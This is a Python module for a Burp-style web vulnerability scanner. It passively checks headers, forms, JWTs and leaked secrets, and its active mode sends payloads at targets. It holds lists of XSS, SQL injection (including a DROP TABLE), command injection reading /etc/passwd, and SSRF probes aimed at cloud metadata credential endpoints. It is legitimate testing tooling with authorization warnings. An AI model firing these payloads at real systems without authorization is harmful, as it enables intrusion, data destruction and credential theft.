"""Security testing module - Burp Suite style features."""

import asyncio
import logging
import re
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse


logger = logging.getLogger("webreaper.security")


class SecurityScanner:
    """Security vulnerability scanner."""
    
    def __init__(self, auto_attack: bool = False):
        self.auto_attack = auto_attack
        self.findings: List[Dict[str, Any]] = []
        
        # Payload libraries
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND pg_sleep(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; DROP TABLE users--",
            "' OR 'x'='x",
            "\" OR \"1\"=\"1",
            "') OR ('1'='1",
        ]
        
        self.command_payloads = [
            "; cat /etc/passwd",
            "; id",
            "; whoami",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            # Note: network callback payloads (ping, nc) require a controlled
            # listener and must be configured by the operator, not hardcoded
        ]
        
        self.ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
            "file:///etc/passwd",
            "file:///proc/self/environ",
            # Note: localhost/127.0.0.1 probes intentionally excluded to avoid
            # accidentally hitting the operator's own services
        ]

        self.ssrf_indicators = [
            r'url=',
            r'redirect=',
            r'next=',
            r'target=',
            r'dest=',
            r'destination=',
            r'redir=',
            r'return=',
            r'return_url=',
            r'callback=',
            r'path=',
            r'data=',
            r'fetch=',
            r'img=',
            r'src=',
        ]
    
    def scan(self, url: str, headers: Dict[str, str], body: str, forms: List[Dict]) -> List[Dict[str, Any]]:
        """Scan a page for vulnerabilities."""
        findings = []
        
        # Check for reflected XSS
        xss_findings = self._check_reflected_xss(url, body)
        findings.extend(xss_findings)
        
        # Check for forms
        for form in forms:
            form_findings = self._scan_form(url, form)
            findings.extend(form_findings)
        
        # Check for interesting headers
        header_findings = self._check_headers(headers)
        findings.extend(header_findings)
        
        # Check for JWT
        jwt_findings = self._check_jwt(body, headers)
        findings.extend(jwt_findings)
        
        # Check for exposed sensitive files
        sensitive_findings = self._check_sensitive_exposure(body)
        findings.extend(sensitive_findings)

        # Check for SSRF-prone URL parameters
        ssrf_findings = self._check_ssrf_params(url)
        findings.extend(ssrf_findings)

        self.findings.extend(findings)
        return findings
    
    def _check_reflected_xss(self, url: str, body: str) -> List[Dict[str, Any]]:
        """Check for reflected XSS vulnerabilities."""
        findings = []
        
        # Check if URL parameters are reflected
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param, values in params.items():
                for value in values:
                    # Check if parameter value is reflected without encoding
                    if value in body and len(value) > 3:
                        # Check if it's in a dangerous context
                        if self._is_dangerous_context(body, value):
                            findings.append({
                                "type": "XSS",
                                "severity": "High",
                                "parameter": param,
                                "evidence": f"Parameter '{param}' reflected in response",
                                "url": url,
                                "remediation": "Encode output, use Content Security Policy"
                            })
        
        return findings
    
    def _is_dangerous_context(self, body: str, value: str) -> bool:
        """Check if reflected value is in a dangerous context."""
        index = body.find(value)
        if index == -1:
            return False
        
        # Check surrounding context
        start = max(0, index - 50)
        end = min(len(body), index + len(value) + 50)
        context = body[start:end]
        
        dangerous_patterns = [
            r'<[^>]*$',  # Inside a tag
            r'<script[^>]*>.*$',  # Inside script tag
            r'on\w+=["\']?$',  # Inside event handler
            r'javascript:',  # JavaScript context
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, context, re.IGNORECASE):
                return True
        
        return False
    
    def _scan_form(self, page_url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan a form for vulnerabilities."""
        findings = []
        inputs = form.get("inputs")
        if inputs is None:
            # Deep extractor form schema uses `fields`
            inputs = form.get("fields", [])
        
        # Check for CSRF protection
        has_csrf = any(
            inp.get("name", "").lower() in ["csrf", "token", "_token", "csrf_token", "_csrf", "csrfmiddlewaretoken", "authenticity_token"]
            for inp in inputs
        )
        
        if not has_csrf and form.get("method") == "POST":
            findings.append({
                "type": "CSRF",
                "severity": "Medium",
                "form_action": form.get("action"),
                "evidence": "Form lacks CSRF token",
                "url": page_url,
                "remediation": "Add CSRF token to form"
            })
        
        # Check for autocomplete on sensitive fields
        for inp in inputs:
            if inp.get("type") in ["password", "token", "secret"]:
                findings.append({
                    "type": "Sensitive Field",
                    "severity": "Info",
                    "field": inp.get("name"),
                    "evidence": f"Sensitive field '{inp.get('name')}' found",
                    "url": page_url,
                })
        
        return findings
    
    def _check_headers(self, headers: Dict[str, str]) -> List[Dict[str, Any]]:
        """Check security headers."""
        findings = []
        
        security_headers = {
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking protection",
            "X-Content-Type-Options": "MIME sniffing protection",
            "Strict-Transport-Security": "HSTS",
            "X-XSS-Protection": "XSS filter",
            "Referrer-Policy": "Referrer control",
            "Permissions-Policy": "Feature policy",
        }
        
        headers_lower = {k.lower(): v for k, v in headers.items()}
        
        for header, description in security_headers.items():
            if header.lower() not in headers_lower:
                findings.append({
                    "type": "Missing Security Header",
                    "severity": "Low",
                    "header": header,
                    "description": description,
                    "evidence": f"{header} header not present",
                    "remediation": f"Add {header} header"
                })
        
        # Check for information disclosure
        server = headers.get("Server", "")
        if server and server != "":
            findings.append({
                "type": "Information Disclosure",
                "severity": "Info",
                "header": "Server",
                "evidence": f"Server: {server}",
                "remediation": "Remove or obfuscate Server header"
            })
        
        # Check for CORS misconfiguration
        cors = headers.get("Access-Control-Allow-Origin", "")
        if cors == "*":
            findings.append({
                "type": "CORS Misconfiguration",
                "severity": "Medium",
                "evidence": "Access-Control-Allow-Origin: *",
                "remediation": "Restrict CORS to specific origins"
            })
        
        return findings
    
    def _check_jwt(self, body: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
        """Check for JWT tokens and issues."""
        findings = []
        
        # JWT pattern
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
        
        # Search in body and headers
        text_to_search = body + " " + str(headers)
        
        matches = re.findall(jwt_pattern, text_to_search)
        for match in matches:
            findings.append({
                "type": "JWT Exposure",
                "severity": "High",
                "token_preview": match[:50] + "...",
                "evidence": "JWT token found in response",
                "remediation": "Don't expose JWT tokens in client-side code"
            })
        
        return findings
    
    def _check_sensitive_exposure(self, body: str) -> List[Dict[str, Any]]:
        """Check for exposed sensitive data."""
        findings = []
        
        patterns = {
            # Specific patterns first — avoid the 32+ char catch-all which matches everything
            "AWS Key": r'AKIA[0-9A-Z]{16}',
            "AWS Secret": r'(?i)aws[_\-\s]?secret[_\-\s]?(?:access[_\-\s]?)?key["\']?\s*[:=]\s*["\'][A-Za-z0-9/+=]{40}["\']',
            "GitHub Token": r'gh[pousr]_[A-Za-z0-9]{36}',
            "Stripe Key": r'sk_(?:live|test)_[A-Za-z0-9]{24,}',
            "Slack Token": r'xox[baprs]-[A-Za-z0-9-]{10,}',
            "Google API Key": r'AIza[0-9A-Za-z\-_]{35}',
            "Private Key": r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
            "Password in Code": r'(?i)password["\']?\s*[:=]\s*["\'][^"\'\s]{6,}["\']',
            "Secret in Code": r'(?i)(?:secret|api_key|apikey)["\']?\s*[:=]\s*["\'][^"\'\s]{8,}["\']',
        }
        
        for name, pattern in patterns.items():
            matches = re.findall(pattern, body)
            if matches:
                findings.append({
                    "type": "Sensitive Data Exposure",
                    "severity": "High" if name in ["Private Key", "AWS Key", "API Key"] else "Medium",
                    "data_type": name,
                    "count": len(matches),
                    "evidence": f"Found {len(matches)} potential {name}(s)",
                    "remediation": "Remove sensitive data from client-side code"
                })
        
        return findings
    
    def _check_ssrf_params(self, url: str) -> List[Dict[str, Any]]:
        """Detect URL parameters that could be SSRF vectors."""
        from urllib.parse import parse_qs, urlparse
        findings = []
        parsed = urlparse(url)
        if not parsed.query:
            return findings
        params = parse_qs(parsed.query)
        for param in params:
            for indicator in self.ssrf_indicators:
                pattern = indicator.rstrip('=') + '='
                if param.lower() == indicator.rstrip('='):
                    findings.append({
                        "type": "Potential SSRF Vector",
                        "severity": "Medium",
                        "parameter": param,
                        "url": url,
                        "evidence": f"Parameter '{param}' may accept URLs — test for SSRF",
                        "remediation": "Validate and allowlist URL destinations server-side",
                    })
                    break
        return findings

    # ── DB error signatures for SQLi error-based detection ──────

    _SQLI_ERROR_PATTERNS = [
        r"you have an error in your sql syntax",          # MySQL
        r"warning: mysql_",                               # MySQL PHP
        r"unclosed quotation mark after the character",   # MSSQL
        r"quoted string not properly terminated",         # Oracle
        r"pg_query\(\): query failed",                    # PostgreSQL PHP
        r"ERROR:\s+syntax error at or near",              # PostgreSQL
        r"ORA-\d{4,5}:",                                  # Oracle ORA errors
        r"microsoft ole db provider for sql server",      # MSSQL via OLE
        r"syntax error or access violation",              # generic
        r"invalid query",
        r"sql syntax.*mysql",
        r"sqlite.*error",
    ]

    _CMDI_MARKERS = [
        "root:x:0:0:",   # /etc/passwd content
        "uid=",           # id command output
        "daemon:",        # passwd file line
    ]

    async def active_scan(
        self,
        url: str,
        forms: List[Dict],
        session,
        aggressive: bool = False,
    ) -> List[Dict[str, Any]]:
        """Active scan: fire payloads against the target. Requires HTTP session.

        WARNING: Only run this against systems you are authorized to test.
        Gate aggressive checks (SQLi, CMDi) behind aggressive=True.
        """
        findings = []
        if not aggressive:
            return findings

        logger.warning(
            f"[ACTIVE SCAN] Firing SQL injection and command injection payloads against {url}. "
            "Only use against authorized targets."
        )

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        sqli_findings = await self._check_sql_injection(url, params, session)
        findings.extend(sqli_findings)

        cmdi_findings = await self._check_command_injection(url, params, session)
        findings.extend(cmdi_findings)

        for form in forms:
            form_sqli = await self._check_form_sql_injection(url, form, session)
            findings.extend(form_sqli)

        self.findings.extend(findings)
        return findings

    async def _check_sql_injection(
        self, url: str, params: Dict[str, List[str]], session
    ) -> List[Dict[str, Any]]:
        """Fire SQLi payloads into URL query parameters, detect via DB error signatures."""
        findings = []
        parsed = urlparse(url)

        for param_name, original_values in params.items():
            for payload in self.sqli_payloads:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                query_string = urlencode(test_params)
                test_url = urlunparse(parsed._replace(query=query_string))

                try:
                    resp = await session.get(test_url, timeout=10)
                    body = getattr(resp, "text", None) or ""
                    if asyncio.iscoroutine(body):
                        body = await body
                    body_lower = body.lower()

                    for pattern in self._SQLI_ERROR_PATTERNS:
                        if re.search(pattern, body_lower):
                            findings.append({
                                "type": "SQL Injection",
                                "severity": "Critical",
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"DB error pattern matched: {pattern[:50]}",
                                "url": test_url,
                                "remediation": "Use parameterized queries / prepared statements",
                            })
                            break  # One finding per param per payload is enough
                except Exception:
                    pass  # Network errors during active scan are expected; continue

        return findings

    async def _check_form_sql_injection(
        self, url: str, form: Dict, session
    ) -> List[Dict[str, Any]]:
        """Fire SQLi payloads into discovered form inputs."""
        findings = []
        action = form.get("action", url)
        method = form.get("method", "GET").upper()

        text_inputs = [
            inp for inp in form.get("inputs", [])
            if inp.get("type", "text") in ("text", "search", "email", "url", "number", "")
        ]
        if not text_inputs:
            return findings

        for payload in self.sqli_payloads[:4]:  # Limit to 4 payloads per form to stay polite
            data = {inp["name"]: payload for inp in text_inputs if inp.get("name")}
            if not data:
                continue
            try:
                if method == "POST":
                    resp = await session.post(action, data=data, timeout=10)
                else:
                    resp = await session.get(action, params=data, timeout=10)
                body = getattr(resp, "text", None) or ""
                if asyncio.iscoroutine(body):
                    body = await body
                body_lower = body.lower()
                for pattern in self._SQLI_ERROR_PATTERNS:
                    if re.search(pattern, body_lower):
                        findings.append({
                            "type": "SQL Injection (Form)",
                            "severity": "Critical",
                            "form_action": action,
                            "payload": payload,
                            "evidence": f"DB error pattern after form submit: {pattern[:50]}",
                            "url": url,
                            "remediation": "Use parameterized queries / prepared statements",
                        })
                        return findings  # One finding per form is enough
            except Exception:
                pass

        return findings

    async def _check_command_injection(
        self, url: str, params: Dict[str, List[str]], session
    ) -> List[Dict[str, Any]]:
        """Fire CMDi payloads, detect via output markers in response."""
        findings = []
        parsed = urlparse(url)

        for param_name in params:
            for payload in self.command_payloads:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                query_string = urlencode(test_params)
                test_url = urlunparse(parsed._replace(query=query_string))

                try:
                    t0 = time.monotonic()
                    resp = await session.get(test_url, timeout=15)
                    elapsed = time.monotonic() - t0
                    body = getattr(resp, "text", None) or ""
                    if asyncio.iscoroutine(body):
                        body = await body

                    for marker in self._CMDI_MARKERS:
                        if marker in body:
                            findings.append({
                                "type": "Command Injection",
                                "severity": "Critical",
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Output marker found in response: {marker!r}",
                                "url": test_url,
                                "remediation": "Never pass user input to shell commands",
                            })
                            return findings  # Stop on first confirmed hit

                    # Timing check for blind injection (SLEEP-based payloads)
                    if "SLEEP" in payload.upper() and elapsed > 4.5:
                        findings.append({
                            "type": "Command Injection (Timing)",
                            "severity": "High",
                            "confidence": "medium",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"Response took {elapsed:.1f}s (expected <4.5s)",
                            "url": test_url,
                            "remediation": "Never pass user input to shell commands",
                        })
                except Exception:
                    pass

        return findings

    def fingerprint_tech(self, url: str, headers: Dict[str, str], body: str) -> Dict[str, List[str]]:
        """Detect technology stack from headers and HTML."""
        tech: Dict[str, List[str]] = {
            "CMS": [],
            "Framework": [],
            "Server": [],
            "CDN / Proxy": [],
            "Analytics": [],
            "JavaScript": [],
            "Security": [],
            "Language": [],
        }

        h = {k.lower(): v for k, v in headers.items()}

        # Server header
        if 'server' in h:
            tech["Server"].append(h['server'])

        # X-Powered-By
        if 'x-powered-by' in h:
            tech["Language"].append(h['x-powered-by'])

        # CDN / Proxy detection
        cdn_headers = {
            'cf-ray': 'Cloudflare',
            'x-cache': 'Cache layer',
            'x-amz-cf-id': 'AWS CloudFront',
            'x-fastly-request-id': 'Fastly',
            'x-varnish': 'Varnish',
            'via': None,
        }
        for hdr, label in cdn_headers.items():
            if hdr in h:
                tech["CDN / Proxy"].append(label or h[hdr])

        # WAF detection
        if 'x-sucuri-id' in h:
            tech["Security"].append("Sucuri WAF")
        if h.get('server', '').lower().startswith('awselb'):
            tech["CDN / Proxy"].append("AWS ELB")

        # Body-based detection
        body_lower = body.lower()

        cms_patterns = {
            "WordPress": ['/wp-content/', '/wp-includes/', 'wp-json'],
            "Drupal": ['drupal.org', 'drupal.js', '/sites/default/'],
            "Joomla": ['/media/jui/', 'joomla!'],
            "Ghost": ['ghost.org/changelog', 'ghost/api'],
            "Shopify": ['cdn.shopify.com', 'shopifycdn.com'],
            "Squarespace": ['squarespace.com', 'static.squarespace'],
            "Wix": ['static.wixstatic.com', 'wix.com/'],
            "Webflow": ['webflow.com', 'uploads-ssl.webflow'],
        }
        for cms, patterns in cms_patterns.items():
            if any(p in body_lower for p in patterns):
                tech["CMS"].append(cms)

        framework_patterns = {
            "React": ['react.development.js', 'react.production.js', '__reactFiber', 'data-reactroot'],
            "Vue.js": ['vue.runtime', '__vue__', 'data-v-'],
            "Angular": ['angular.min.js', 'ng-version=', 'data-ng-'],
            "Next.js": ['_next/static', '__NEXT_DATA__'],
            "Nuxt.js": ['_nuxt/', '__nuxt'],
            "Django": ['csrfmiddlewaretoken', 'django'],
            "Laravel": ['laravel_session', 'laravel', 'x-csrf-token'],
            "Ruby on Rails": ['rails.js', 'authenticity_token'],
            "Express.js": ['x-powered-by: express'],
            "Flask": ['werkzeug', 'flask'],
        }
        for fw, patterns in framework_patterns.items():
            if any(p.lower() in body_lower or p.lower() in str(headers).lower() for p in patterns):
                tech["Framework"].append(fw)

        js_patterns = {
            "jQuery": ['jquery.min.js', 'jquery-'],
            "Bootstrap": ['bootstrap.min.js', 'bootstrap.min.css'],
            "Tailwind CSS": ['tailwindcss', 'cdn.tailwindcss'],
            "Google Analytics": ['google-analytics.com', 'gtag(', 'UA-'],
            "Google Tag Manager": ['googletagmanager.com', 'GTM-'],
            "Hotjar": ['hotjar.com', 'hj('],
            "Intercom": ['intercom.io', 'intercomSettings'],
            "Stripe": ['js.stripe.com'],
            "Sentry": ['sentry.io', 'Sentry.init'],
        }
        for lib, patterns in js_patterns.items():
            if any(p.lower() in body_lower for p in patterns):
                cat = "Analytics" if lib in ("Google Analytics", "Google Tag Manager", "Hotjar") else "JavaScript"
                tech[cat].append(lib)

        # Deduplicate
        return {k: list(set(v)) for k, v in tech.items()}

    def generate_report(self) -> Dict[str, Any]:
        """Generate security scan report."""
        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}

        for finding in self.findings:
            sev = finding.get("severity", "Info")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        return {
            "total_findings": len(self.findings),
            "severity_breakdown": severity_counts,
            "findings": self.findings,
        }
